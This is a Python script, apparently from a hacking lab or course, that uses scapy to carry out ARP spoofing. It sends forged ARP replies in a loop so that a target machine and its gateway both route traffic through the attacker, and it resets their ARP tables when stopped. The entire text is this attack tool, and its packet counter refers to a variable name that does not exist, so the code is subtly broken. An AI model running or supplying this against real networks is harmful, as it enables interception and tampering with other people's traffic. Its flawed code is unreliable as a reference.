import scapy.all as scapy
import time

def getMac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    response_packet = scapy.ARP(op=2, psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
    scapy.send(response_packet)

def restore(destination_ip, source_ip):
    destination_mac = getMac(destination_ip)
    source_mac = getMac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packet Sent : " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL+C ........ Resetting ARP tables ...... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
